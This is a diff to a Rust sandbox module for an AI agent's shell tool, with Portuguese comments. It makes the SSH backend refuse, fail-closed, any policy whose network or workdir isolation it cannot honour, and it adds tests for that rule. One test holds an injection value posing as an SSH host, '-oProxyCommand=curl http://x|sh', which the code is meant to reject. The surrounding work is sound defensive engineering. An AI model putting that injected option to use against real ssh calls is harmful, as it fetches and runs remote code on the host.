@@ -13,6 +13,12 @@
 //!   `SandboxBackend` para eles e nenhuma entrega prometida; o assunto está
 //!   registrado na #1225 (issue de tracking, slices S2/S3). Backends que
 //!   existem: Docker, Podman e SSH.
+//! - **SSH só com reconhecimento explícito** (#1225 S3, ADR 0019): o ramo
+//!   `ssh` não tem como honrar `network_disabled` nem `mount_workdir`, e os
+//!   defaults das duas são `true`. Em vez de ignorá-las em silêncio,
+//!   `wrap_command` recusa fail-closed enquanto qualquer uma estiver ligada;
+//!   o operador escreve `false` nas duas para dizer que sabe que `ssh` é
+//!   execução remota sem isolamento de rede/mount.
 //! - **Unix na prática**: o `BashTool` escolhe `powershell -Command` no
 //!   Windows e entregaria a ele uma linha com quoting POSIX. Ligar o sandbox
 //!   fora de unix não contém nada — ver `docs/security/threat-model.md` §5.13.
@@ -107,6 +113,12 @@ pub enum SandboxBackend {
     Podman,
     /// `ssh <host> -- ...` — execução remota; NÃO é sandbox rígido (documentar
     /// para o operador), útil para isolar do host local.
+    ///
+    /// Não tem como honrar `network_disabled` nem `mount_workdir`: não há
+    /// `--network none` nem mount num `ssh`. Por isso a policy com este
+    /// backend é **recusada** (fail-closed) enquanto qualquer uma das duas
+    /// estiver `true` — ver [`SandboxPolicy::chaves_que_ssh_nao_honra`]
+    /// (#1225 S3, ADR 0019).
     Ssh(String),
 }
 
@@ -207,6 +219,42 @@ impl SandboxPolicy {
         self.elevated.iter().any(|t| t == tool_name)
     }
 
+    /// Chaves de `agent.sandbox` ligadas nesta policy que o backend `ssh`
+    /// **não consegue honrar** (#1225 S3, ADR 0019).
+    ///
+    /// O ramo SSH monta `ssh <host> -- sh -lc …` e nada mais: não existe
+    /// `--network none` nem mount do `cwd` numa sessão `ssh`. Até a S3 ele
+    /// simplesmente **ignorava** `network_disabled` e `mount_workdir` — e como
+    /// as duas têm default `true`, um `agent.sandbox` com `backend = ssh` e
+    /// sem mais nada lia como "rede desligada, workdir contido" quando nenhuma
+    /// das duas era verdade. Fail-open por omissão, na chave que promete
+    /// contenção.
+    ///
+    /// A regra é fail-closed: enquanto qualquer uma das duas estiver `true`,
+    /// [`Self::wrap_command`] recusa o comando. O operador reconhece que `ssh`
+    /// é execução remota SEM isolamento de rede/mount escrevendo
+    /// `agent.sandbox.network_disabled = false` e
+    /// `agent.sandbox.mount_workdir = false` — o `false` explícito é o
+    /// reconhecimento, e é por isso que o default não passa.
+    ///
+    /// Devolve vazio para `docker`/`podman` (que honram as duas), para `ssh`
+    /// com as duas em `false`, e quando não há backend (esse caso já é
+    /// recusado por outro motivo). Pública porque `sandbox_policy_from` a usa
+    /// para avisar no boot — o mesmo predicado nos dois lugares, para as
+    /// camadas não discordarem.
+    pub fn chaves_que_ssh_nao_honra(&self) -> Vec<&'static str> {
+        let mut chaves = Vec::new();
+        if let Some(SandboxBackend::Ssh(_)) = self.backend {
+            if self.network_disabled {
+                chaves.push("agent.sandbox.network_disabled");
+            }
+            if self.mount_workdir {
+                chaves.push("agent.sandbox.mount_workdir");
+            }
+        }
+        chaves
+    }
+
     /// Envolve `command` no backend. `cwd` é o diretório de trabalho do host.
     ///
     /// Retorna `Err` fail-closed quando o sandbox é necessário mas o backend
@@ -269,6 +317,22 @@ impl SandboxPolicy {
                     .into(),
             ));
         }
+        // #1225 S3: policy que o backend nao consegue honrar e recusada AQUI,
+        // e nao rebaixada. Tambem antes do `is_available()`: num host sem
+        // cliente `ssh` o erro de backend ausente esconderia este, e o
+        // operador instalaria o ssh para descobrir o problema de verdade so
+        // no comando seguinte.
+        let nao_honradas = self.chaves_que_ssh_nao_honra();
+        if !nao_honradas.is_empty() {
+            return Err(Error::Agent(format!(
+                "sandbox fail-closed: agent.sandbox.backend = ssh e execucao remota SEM \
+                 isolamento de rede nem de mount e nao consegue honrar {} = true. Para usar ssh \
+                 mesmo assim, reconheca isso explicitamente com \
+                 agent.sandbox.network_disabled = false e agent.sandbox.mount_workdir = false; \
+                 para contencao de verdade, use agent.sandbox.backend = docker ou podman.",
+                nao_honradas.join(" = true e ")
+            )));
+        }
         if !backend.is_available() {
             return Err(Error::Agent(format!(
                 "sandbox fail-closed: backend `{}` não encontrado no host; \
@@ -306,6 +370,14 @@ impl SandboxPolicy {
             SandboxBackend::Ssh(host) => {
                 // NOTA: ssh não isola o host remoto; é isolamento do host
                 // local. Documentado como tal no módulo e nos docs.
+                //
+                // Este ramo NÃO consome `network_disabled` nem `mount_workdir`
+                // — não há `--network none` nem mount num `ssh`. Não é
+                // omissão: só se chega aqui com as duas em `false`, porque
+                // `chaves_que_ssh_nao_honra` recusou tudo o mais lá em cima
+                // (#1225 S3). Se um dia o ssh passar a honrar alguma delas, é
+                // aquele predicado que encolhe, não este ramo que cresce em
+                // silêncio.
                 //
                 // Quoting DUPLO aqui, e não por engano: o `ssh` não entrega
                 // argv ao host remoto — ele junta os argumentos numa string e
@@ -379,7 +451,10 @@ mod tests {
         let ssh = SandboxPolicy {
             mode: SandboxMode::All,
             backend: Some(SandboxBackend::Ssh("box".into())),
+            // As duas em `false` de proposito: e o reconhecimento explicito
+            // que a S3 exige para o ssh passar (ver o teste dedicado).
             mount_workdir: false,
+            network_disabled: false,
             ..SandboxPolicy::default()
         };
         match ssh.wrap_command("bash", "echo oi", "/tmp") {
@@ -432,6 +507,7 @@ mod tests {
                 "-oProxyCommand=curl http://x|sh".into(),
             )),
             mount_workdir: false,
+            network_disabled: false,
             ..SandboxPolicy::default()
         };
         let err = p
@@ -465,6 +541,167 @@ mod tests {
             .expect_err("imagem que parece opcao tem de ser recusada");
         assert!(err.to_string().contains("fail-closed"), "err = {err}");
         assert!(!err.to_string().contains("entrypoint"), "vazou: {err}");
+    }
+
+    /// #1225 S3: `ssh` nao tem como honrar `network_disabled`. Antes o ramo
+    /// SSH a ignorava em silencio — e como o default e `true`, uma policy
+    /// ssh "so com host" lia como rede desligada sem desligar nada. Agora e
+    /// recusa fail-closed: `Err`, e nenhuma linha `ssh …` e montada.
+    ///
+    /// Mutacao coberta: remover a checagem faz o wrap devolver `Ok(Some(…))`
+    /// num host com ssh, ou o erro de "backend nao encontrado" num host sem —
+    /// nenhum dos dois contem a chave, entao o teste fica vermelho em
+    /// qualquer maquina.
+    #[test]
+    fn ssh_com_network_disabled_e_recusado_e_nao_monta_comando() {
+        let p = SandboxPolicy {
+            mode: SandboxMode::All,
+            backend: Some(SandboxBackend::Ssh("box".into())),
+            mount_workdir: false,
+            network_disabled: true,
+            ..SandboxPolicy::default()
+        };
+        assert_eq!(
+            p.chaves_que_ssh_nao_honra(),
+            vec!["agent.sandbox.network_disabled"]
+        );
+        let err = p
+            .wrap_command("bash", "echo nunca", "/tmp")
+            .expect_err("ssh com network_disabled=true tem de ser recusado");
+        let msg = err.to_string();
+        assert!(msg.contains("fail-closed"), "msg = {msg}");
+        // Nomeia a chave real e a acao — o operador conserta a config, nao
+        // adivinha.
+        assert!(
+            msg.contains("agent.sandbox.network_disabled"),
+            "msg = {msg}"
+        );
+        assert!(
+            msg.contains("agent.sandbox.network_disabled = false"),
+            "a acao (o `false` explicito) tem de estar na mensagem: {msg}"
+        );
+        assert!(
+            msg.contains("docker"),
+            "a alternativa com contencao de verdade: {msg}"
+        );
+        // A recusa vem ANTES do `is_available()`: nao depende de haver ssh.
+        assert!(
+            !msg.contains("não encontrado no host"),
+            "o erro de backend ausente mascarou o de policy: {msg}"
+        );
+        // E nenhuma linha de comando foi montada — a mensagem nao carrega o
+        // `ssh 'box' --` que o ramo produziria.
+        assert!(!msg.contains("ssh 'box'"), "montou o comando: {msg}");
+    }
+
+    /// Mesma regra para `mount_workdir`: o ssh nao monta nada.
+    #[test]
+    fn ssh_com_mount_workdir_e_recusado() {
+        let p = SandboxPolicy {
+            mode: SandboxMode::All,
+            backend: Some(SandboxBackend::Ssh("box".into())),
+            mount_workdir: true,
+            network_disabled: false,
+            ..SandboxPolicy::default()
+        };
+        assert_eq!(
+            p.chaves_que_ssh_nao_honra(),
+            vec!["agent.sandbox.mount_workdir"]
+        );
+        let err = p
+            .wrap_command("bash", "echo nunca", "/tmp")
+            .expect_err("ssh com mount_workdir=true tem de ser recusado");
+        let msg = err.to_string();
+        assert!(msg.contains("agent.sandbox.mount_workdir"), "msg = {msg}");
+        assert!(
+            !msg.contains("agent.sandbox.network_disabled = true"),
+            "so a chave ligada e apontada como problema: {msg}"
+        );
+    }
+
+    /// O caso do operador que so escreveu `backend = ssh` e `ssh_host`: os
+    /// DOIS defaults estao ligados, e a mensagem nomeia os dois.
+    #[test]
+    fn ssh_com_os_dois_defaults_nomeia_as_duas_chaves() {
+        let p = SandboxPolicy {
+            mode: SandboxMode::All,
+            backend: Some(SandboxBackend::Ssh("box".into())),
+            ..SandboxPolicy::default()
+        };
+        assert_eq!(
+            p.chaves_que_ssh_nao_honra(),
+            vec![
+                "agent.sandbox.network_disabled",
+                "agent.sandbox.mount_workdir"
+            ]
+        );
+        let msg = p
+            .wrap_command("bash", "echo nunca", "/tmp")
+            .expect_err("defaults com ssh sao recusados")
+            .to_string();
+        assert!(
+            msg.contains("agent.sandbox.network_disabled = true"),
+            "msg = {msg}"
+        );
+        assert!(
+            msg.contains("agent.sandbox.mount_workdir = true"),
+            "msg = {msg}"
+        );
+    }
+
+    /// O reconhecimento explicito destrava: com as duas em `false` a recusa
+    /// da S3 nao dispara. O que sobra depende do host (cliente ssh instalado
+    /// ou nao) e os dois desfechos legitimos sao assertados — o que NAO pode
+    /// acontecer e o erro de "nao consegue honrar".
+    #[test]
+    fn ssh_com_as_duas_em_false_explicito_passa_pela_recusa_da_s3() {
+        let p = SandboxPolicy {
+            mode: SandboxMode::All,
+            backend: Some(SandboxBackend::Ssh("box".into())),
+            mount_workdir: false,
+            network_disabled: false,
+            ..SandboxPolicy::default()
+        };
+        assert!(p.chaves_que_ssh_nao_honra().is_empty());
+        match p.wrap_command("bash", "echo oi", "/tmp") {
+            Ok(Some(linha)) => {
+                assert!(linha.starts_with("ssh 'box' -- sh -lc "), "linha = {linha}")
+            }
+            Err(e) => {
+                let msg = e.to_string();
+                assert!(
+                    msg.contains("não encontrado no host"),
+                    "erro inesperado: {msg}"
+                );
+                assert!(
+                    !msg.contains("nao consegue honrar"),
+                    "reconhecimento explicito ignorado: {msg}"
+                );
+            }
+            Ok(None) => panic!("mode = all deveria sandboxar `bash`"),
+        }
+    }
+
+    /// `docker`/`podman` honram as duas flags, entao o predicado e vazio para
+    /// eles mesmo com tudo ligado — a recusa e do ssh, nao das flags.
+    #[test]
+    fn docker_e_podman_honram_as_flags_e_nao_sao_recusados_por_elas() {
+        for backend in [SandboxBackend::Docker, SandboxBackend::Podman] {
+            let p = SandboxPolicy {
+                mode: SandboxMode::All,
+                backend: Some(backend),
+                mount_workdir: true,
+                network_disabled: true,
+                ..SandboxPolicy::default()
+            };
+            assert!(p.chaves_que_ssh_nao_honra().is_empty());
+            if let Err(e) = p.wrap_command("bash", "echo oi", "/tmp") {
+                assert!(
+                    !e.to_string().contains("nao consegue honrar"),
+                    "docker/podman recusado pela regra do ssh: {e}"
+                );
+            }
+        }
     }
 
     /// O guard so vale onde o sandbox se aplica: `mode = off` continua
